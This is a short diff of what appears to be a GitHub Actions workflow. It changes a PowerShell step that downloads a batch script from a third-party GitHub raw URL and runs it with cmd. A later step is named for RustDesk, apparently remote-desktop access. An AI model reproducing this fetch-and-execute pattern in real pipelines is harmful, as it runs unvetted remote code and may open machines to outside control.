@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mobitab333/chgit3/refs/heads/main/main.bat" -OutFile "main.bat"
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mobitab333/chgit3/refs/heads/main/d.bat" -OutFile "main.bat"
           cmd /c main.bat
 
       - name: Log to rustdesk
